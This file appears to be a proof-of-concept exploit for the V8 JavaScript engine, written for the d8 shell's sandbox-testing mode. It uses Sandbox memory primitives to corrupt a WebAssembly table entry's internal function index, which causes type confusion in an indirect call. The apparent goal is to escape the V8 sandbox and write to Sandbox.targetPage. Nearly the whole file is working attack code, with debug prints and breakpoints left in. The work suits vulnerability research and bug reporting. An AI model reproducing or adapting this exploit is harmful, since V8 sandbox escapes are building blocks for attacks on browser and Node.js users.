// Flags: --sandbox-testing --experimental-wasm-type-reflection

d8.file.execute("/home/vult/Desktop/v8-wasm/v8/test/mjsunit/wasm/wasm-module-builder.js");

// module 0
let builder = new WasmModuleBuilder();
let $struct = builder.addStruct([makeField(kWasmI64, true)]);
let $sig0 = builder.addType(makeSig([], [wasmRefType($struct)]));
let sig1 = kSig_l_v;// makeSig([], [kWasmI64]);
let $sig1 = builder.addType(sig1);
let $sig2 = builder.addType(makeSig([], [kWasmI64]));
let $sig_writer = builder.addType(makeSig([wasmRefType($struct), kWasmI64], []));

let $sig0_func = builder.addFunction("sig0_placeholder", $sig0).addBody([
  kGCPrefix, kExprStructNewDefault, $struct
]);
let $sig1_func = builder.addFunction("placeholder", $sig1).addBody([
  kExprI64Const, 0,
]).exportFunc();

let $sig2_func = builder.addFunction("dummy", $sig2).addBody([
  kExprI64Const, 0,
]);

let $writer = builder.addFunction("writer", $sig_writer)
  .exportFunc()
  .addBody([
      kExprLocalGet, 0,
      kExprLocalGet, 1,
      kGCPrefix, kExprStructSet, $struct, 0,
  ]);

let $t0 = builder
    .addTable(wasmRefType($sig_writer), 1, 1, [kExprRefFunc, $writer.index])
    .exportAs('table0');
let $t1 = builder
    .addTable(wasmRefType($sig1), 1, 1, [kExprRefFunc, $sig1_func.index])
    .exportAs('table1');

let $t2 = builder
    .addTable(wasmRefType($sig2), 1, 1, [kExprRefFunc, $sig2_func.index])
    .exportAs('table2');

let instance0 = builder.instantiate();
let { table0, table1, table2 } = instance0.exports;

%DebugPrint(instance0);
console.log("====");

// module 1
builder = new WasmModuleBuilder();
$struct = builder.addStruct([makeField(kWasmI64, true)]);
$sig0 = builder.addType(makeSig([], [wasmRefType($struct)]));
$sig1 = builder.addType(sig1);
let $sig3 = builder.addType(makeSig([], [kWasmI64]));

let $boom = builder.addFunction("boom", makeSig([], [kWasmI64]))
  .exportFunc()
  .addBody([
    kExprI32Const, 0,
    kExprCallIndirect, $sig3, 0,
    // kExprI64Const, 12,
    // kGCPrefix, kExprStructSet, $struct, 0,
  ]);
let $t_imp =
    builder.addImportedTable('import', 'table', 1, 1, wasmRefType($sig3));

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kWasmTableObjectTypeOffset = 28;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

const kRef = 9;
const kSmiTagSize = 1;
const kHeapTypeShift = 5;

// Put a WasmJSFunction into table1 while it still has type $sig1.
// table1.set(0, new WebAssembly.Function(
//   {parameters: [], results: ['i64']},
//   () => BigInt(Sandbox.targetPage)));

table0.set(0, instance0.exports.writer);

table1.set(0, instance0.exports.placeholder);

table2.set(0, new WebAssembly.Function(
  {parameters: [], results: ['i64']},
  () => BigInt(Sandbox.targetPage)));

%DebugPrint(table2);
console.log("====");
%DebugPrint(table1);
%SystemBreak();

// // // Now set table1's type to $sig0.
let t0 = getPtr(table0);
let t2 = getPtr(table2);
let t1 = getPtr(table1);
// let t0_type = getField(t0, kWasmTableObjectTypeOffset);
// let expected_old_type = (($sig1 << kHeapTypeShift) | kRef) << kSmiTagSize;
// setField(t1, kWasmTableObjectTypeOffset, t0_type);

/* 
  Instead of changing table_type, we can change the FuncRef in table1 
*/
let entries2 = getField(t2, 0xc);
let entry0_2 = getField(entries2, 0x8);
let internal_pointer_index_2 = getField(entry0_2, 4);
console.log("internal_pointer_index_2: 0x" + internal_pointer_index_2.toString(16));

let entries1 = getField(t1, 0xc);
let entry0_1 = getField(entries1, 0x8);
let internal_pointer_index_1 = getField(entry0_1, 4);
console.log("internal_pointer_index_1: 0x" + internal_pointer_index_1.toString(16));

let entries0 = getField(t0, 0xc);
let entry0_0 = getField(entries0, 0x8);
let internal_pointer_index_0 = getField(entry0_0, 4);
console.log("internal_pointer_index_0: 0x" + internal_pointer_index_0.toString(16));

// Change the internal_pointer_index_1 to internal_pointer_index_2
setField(entry0_1, 4, internal_pointer_index_0);
console.log("After setting internal pointer index field");
console.log("internal_pointer_index_1: 0x" + getField(entry0_1, 4).toString(16));

// // Instantiation accepts the table due to its corrupted type.
let instance1 = builder.instantiate({'import': {'table': table1}});

console.log("0x" + instance1.exports.boom().toString(16));
